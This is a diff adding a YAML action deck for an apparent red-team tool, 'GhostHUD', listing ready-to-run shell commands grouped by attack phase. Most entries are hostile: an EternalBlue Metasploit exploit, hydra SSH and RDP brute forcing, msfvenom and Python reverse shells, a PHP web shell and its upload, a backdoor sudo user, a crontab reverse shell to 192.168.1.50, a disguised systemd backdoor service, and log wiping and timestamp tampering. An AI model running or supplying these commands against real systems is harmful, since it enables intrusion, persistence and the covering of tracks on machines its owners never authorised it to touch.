@@ -1,0 +1,214 @@
+# GhostActions.yaml - Red Team Ops Deck (by KK&GDevOps)
+# Cross-platform cybersecurity automation for GhostHUD
+# Compatible with Linux, Termux, Kali, and other Unix-like systems
+
+actions:
+  # RECONNAISSANCE
+  - name: "Network Discovery"
+    command: "nmap -sn 192.168.1.0/24 | grep -E 'Nmap scan report|MAC Address'"
+    category: "Recon"
+
+  - name: "Port Scan Top 1000"
+    command: "nmap -F --open -T4 192.168.1.1 | grep -v 'closed'"
+    category: "Recon"
+
+  - name: "Service Version Detection"
+    command: "nmap -sV -p 22,80,443,445,993,995 192.168.1.1"
+    category: "Recon"
+
+  - name: "OS Fingerprinting"
+    command: "nmap -O -Pn 192.168.1.1 | grep -A 5 'OS details'"
+    category: "Recon"
+
+  - name: "Web Directory Fuzzing"
+    command: "curl -s -o /dev/null -w '%{http_code}' http://target.com/admin && echo 'Found: /admin' || echo 'Not found: /admin'"
+    category: "Recon"
+
+  # OSINT (Open Source Intelligence)
+  - name: "DNS Enumeration"
+    command: "dig +short target.com ANY && dig +short @8.8.8.8 target.com TXT"
+    category: "OSINT"
+
+  - name: "Subdomain Discovery"
+    command: "curl -s 'https://crt.sh/?q=%25.target.com&output=json' | grep -oE '\"name_value\":\"[^\"]*\"' | cut -d'\"' -f4 | sort -u"
+    category: "OSINT"
+
+  - name: "WHOIS Lookup"
+    command: "whois target.com | grep -E 'Registrar|Creation Date|Expiry|Name Server'"
+    category: "OSINT"
+
+  - name: "Email Harvesting"
+    command: "curl -s 'https://api.hunter.io/v2/domain-search?domain=target.com&api_key=YOUR_API_KEY' | grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}'"
+    category: "OSINT"
+
+  - name: "Social Media Recon"
+    command: "curl -s 'https://www.linkedin.com/company/target' | grep -oE 'employees.*[0-9]+' | head -1"
+    category: "OSINT"
+
+  # EXPLOITATION
+  - name: "SMB Vulnerability Scan"
+    command: "nmap --script smb-vuln-* -p 445 192.168.1.100"
+    category: "Exploitation"
+
+  - name: "Web Vulnerability Scan"
+    command: "nmap --script http-vuln-* -p 80,443 192.168.1.100"
+    category: "Exploitation"
+
+  - name: "SQL Injection Test"
+    command: "curl -s 'http://target.com/login.php' -d \"username=admin' OR '1'='1&password=test\" | grep -i 'welcome\\|dashboard\\|error'"
+    category: "Exploitation"
+
+  - name: "Brute Force SSH"
+    command: "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100 -t 4 -V"
+    category: "Exploitation"
+
+  - name: "Exploit EternalBlue"
+    command: "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.100; exploit; exit'"
+    category: "Exploitation"
+
+  # PAYLOADS
+  - name: "Generate Reverse Shell"
+    command: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf > shell.elf"
+    category: "Payloads"
+
+  - name: "Create PHP Web Shell"
+    command: "echo '<?php system($_GET[\"cmd\"]); ?>' > webshell.php"
+    category: "Payloads"
+
+  - name: "PowerShell Payload"
+    command: "msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f powershell > payload.ps1"
+    category: "Payloads"
+
+  - name: "Python Reverse Shell"
+    command: "echo 'import socket,subprocess,os;s=socket.socket();s.connect((\"192.168.1.50\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])' > revshell.py"
+    category: "Payloads"
+
+  - name: "Netcat Listener"
+    command: "nc -nvlp 4444"
+    category: "Payloads"
+
+  # POST-EXPLOITATION
+  - name: "System Information"
+    command: "uname -a && whoami && id && cat /etc/passwd | wc -l"
+    category: "Post-Exploitation"
+
+  - name: "Find SUID Files"
+    command: "find / -perm -4000 -type f 2>/dev/null | head -20"
+    category: "Post-Exploitation"
+
+  - name: "Extract Passwords"
+    command: "grep -r password /home/ 2>/dev/null | grep -v Binary | head -10"
+    category: "Post-Exploitation"
+
+  - name: "Network Connections"
+    command: "netstat -tulpn | grep LISTEN"
+    category: "Post-Exploitation"
+
+  - name: "Privilege Escalation Check"
+    command: "sudo -l 2>/dev/null && find /etc -writable 2>/dev/null | head -10"
+    category: "Post-Exploitation"
+
+  # PERSISTENCE
+  - name: "Add Backdoor User"
+    command: "useradd -m -s /bin/bash ghost && echo 'ghost:password123' | chpasswd && usermod -aG sudo ghost"
+    category: "Persistence"
+
+  - name: "Create SSH Key"
+    command: "ssh-keygen -t rsa -b 2048 -f ~/.ssh/backdoor -N '' && cat ~/.ssh/backdoor.pub"
+    category: "Persistence"
+
+  - name: "Crontab Persistence"
+    command: "echo '*/5 * * * * /bin/bash -c \"bash -i >& /dev/tcp/192.168.1.50/4444 0>&1\"' | crontab -"
+    category: "Persistence"
+
+  - name: "Service Persistence"
+    command: "echo '[Unit]\\nDescription=System Update\\n[Service]\\nExecStart=/tmp/backdoor\\nRestart=always\\n[Install]\\nWantedBy=multi-user.target' > /etc/systemd/system/update.service"
+    category: "Persistence"
+
+  - name: "Web Shell Upload"
+    command: "curl -F 'file=@webshell.php' http://target.com/upload.php"
+    category: "Persistence"
+
+  # LATERAL MOVEMENT
+  - name: "Internal Network Scan"
+    command: "nmap -sS -T4 --open 192.168.0.0/16 | grep -B 4 'open'"
+    category: "Lateral Movement"
+
+  - name: "SMB Share Enumeration"
+    command: "smbclient -L //192.168.1.100 -N"
+    category: "Lateral Movement"
+
+  - name: "RDP Brute Force"
+    command: "hydra -L users.txt -P passwords.txt rdp://192.168.1.100 -t 4"
+    category: "Lateral Movement"
+
+  - name: "WMI Command Execution"
+    command: "wmic /node:192.168.1.100 /user:admin /password:pass123 process call create 'cmd.exe /c whoami'"
+    category: "Lateral Movement"
+
+  - name: "SSH Tunneling"
+    command: "ssh -L 8080:192.168.1.200:80 user@192.168.1.100 -N -f"
+    category: "Lateral Movement"
+
+  # NETWORKING
+  - name: "ARP Spoofing"
+    command: "ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//"
+    category: "Networking"
+
+  - name: "DNS Spoofing"
+    command: "echo '192.168.1.50 target.com' >> /etc/hosts"
+    category: "Networking"
+
+  - name: "Packet Capture"
+    command: "tcpdump -i any -w capture.pcap -c 100"
+    category: "Networking"
+
+  - name: "WiFi Monitor Mode"
+    command: "airmon-ng start wlan0 && airodump-ng wlan0mon"
+    category: "Networking"
+
+  - name: "Port Forwarding"
+    command: "socat TCP-LISTEN:8080,fork TCP:192.168.1.200:80 &"
+    category: "Networking"
+
+  # MONITORING
+  - name: "Real-time Processes"
+    command: "watch -n 1 'ps aux --sort=-%cpu | head -10'"
+    category: "Monitoring"
+
+  - name: "Network Traffic Monitor"
+    command: "iftop -i any -n -P"
+    category: "Monitoring"
+
+  - name: "Log File Monitoring"
+    command: "tail -f /var/log/auth.log | grep -E 'Failed|Accepted'"
+    category: "Monitoring"
+
+  - name: "System Resource Usage"
+    command: "htop -d 10"
+    category: "Monitoring"
+
+  - name: "Connection Monitoring"
+    command: "watch -n 2 'netstat -tulpn | grep ESTABLISHED'"
+    category: "Monitoring"
+
+  # CLEANUP
+  - name: "Clear Command History"
+    command: "history -c && history -w && rm ~/.bash_history"
+    category: "Cleanup"
+
+  - name: "Remove Log Entries"
+    command: "sed -i '/192.168.1.50/d' /var/log/auth.log && sed -i '/ghost/d' /var/log/syslog"
+    category: "Cleanup"
+
+  - name: "Delete Temporary Files"
+    command: "rm -rf /tmp/* /var/tmp/* ~/.cache/* 2>/dev/null"
+    category: "Cleanup"
+
+  - name: "Secure File Deletion"
+    command: "shred -vfz -n 3 /path/to/sensitive/file"
+    category: "Cleanup"
+
+  - name: "Reset Timestamps"
+    command: "touch -r /bin/ls /tmp/backdoor && touch -r /etc/passwd /etc/shadow"
+    category: "Cleanup"
